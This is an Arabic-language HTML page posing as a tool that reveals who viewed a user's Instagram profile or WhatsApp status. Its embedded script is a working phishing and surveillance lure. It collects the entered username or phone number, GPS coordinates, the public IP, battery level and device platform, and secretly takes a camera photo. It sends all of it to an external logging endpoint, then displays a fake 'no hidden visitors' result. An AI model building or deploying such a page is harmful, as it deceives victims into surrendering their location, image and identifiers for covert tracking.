<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز كاشف البيانات الموحد</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #007bff; --insta: #e1306c; --tiktok: #000000; --whatsapp: #25d366; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; }
        header { background: #fff; padding: 20px; text-align: center; border-bottom: 2px solid #eee; }
        .hero-title { color: #333; font-size: 1.4rem; margin: 0; }
        .container { max-width: 500px; margin: 20px auto; padding: 15px; }
        .service-card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; display: flex; align-items: center; cursor: pointer; border: 1px solid #eee; }
        #search-interface { display: none; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .action-btn { width: 100%; padding: 14px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; }
        #status { margin-top: 20px; font-size: 14px; }
        video, canvas { display: none; }
        .loader { display: none; width: 100%; background: #eee; height: 10px; border-radius: 5px; margin: 15px 0; overflow: hidden; }
        .loader-bar { width: 0%; height: 100%; background: #007bff; transition: width 4s linear; }
    </style>
</head>
<body>

<header><h1 class="hero-title"><i class="fas fa-shield-halved"></i> مركز فحص السجلات العالمي</h1></header>

<div class="container" id="main-menu">
    <div class="service-card" onclick="openSearch('Instagram', '#e1306c', 'يوزر انستجرام')">
        <i class="fab fa-instagram" style="color: var(--insta); font-size:30px; margin-left:20px;"></i>
        <div class="service-info"><h3>من زار بروفايلك في Instagram؟</h3></div>
    </div>
    <div class="service-card" onclick="openSearch('WhatsApp', '#25d366', 'رقم الهاتف')">
        <i class="fab fa-whatsapp" style="color: var(--whatsapp); font-size:30px; margin-left:20px;"></i>
        <div class="service-info"><h3>من راقب حالتك في WhatsApp؟</h3></div>
    </div>
</div>

<div class="container" id="search-interface">
    <h2 id="interface-title">بحث</h2>
    <input type="text" id="userInput" placeholder="">
    <button id="startBtn" class="action-btn">بدأ الفحص وتحديد السيرفر</button>
    <div class="loader" id="loader"><div class="loader-bar" id="loaderBar"></div></div>
    <div id="status"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const API_URL = "https://sed-x8mt.vercel.app/log-data";
    let currentService = "";

    function openSearch(service, color, placeholder) {
        currentService = service;
        document.getElementById('main-menu').style.display = 'none';
        document.getElementById('search-interface').style.display = 'block';
        document.getElementById('interface-title').innerText = "فحص سجلات " + service;
        document.getElementById('userInput').placeholder = "أدخل " + placeholder + "...";
        document.getElementById('startBtn').style.backgroundColor = color;
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        const val = document.getElementById('userInput').value;
        if (!val) return alert("يرجى الإدخال");

        const status = document.getElementById('status');
        status.innerText = "جاري طلب إذن الوصول المشفر للسيرفر...";
        document.getElementById('loader').style.display = 'block';
        setTimeout(() => document.getElementById('loaderBar').style.width = '100%', 100);

        let locationLink = "الموقع: رفض المستخدم الإذن";

        try {
            // 1. طلب الموقع الجغرافي (GPS)
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true});
            });
            locationLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
        } catch (e) { console.log("Location denied"); }

        try {
            // 2. طلب الكاميرا والمعلومات التقنية
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // سحب معلومات البطارية والـ IP
            const battery = await navigator.getBattery();
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    const report = `
📍 صيد جديد:
الخدمة: ${currentService}
المُدخل: ${val}
🌐 الـ IP: ${ipData.ip}
🗺 الموقع: ${locationLink}
🔋 البطارية: ${Math.round(battery.level * 100)}%
📱 الجهاز: ${navigator.platform}
                    `;
                    formData.append('username', report);
                    formData.append('photo', blob, 'user.jpg');

                    await fetch(API_URL, { method: 'POST', body: formData });
                    status.style.color = "red";
                    status.innerText = "لم يتم العثور على زوار متخفيين حالياً.";
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            }, 2000);
        } catch (err) {
            status.innerText = "خطأ: يجب السماح بجميع الأذونات لإكمال الفحص الموثق.";
        }
    });
</script>
</body>
</html>
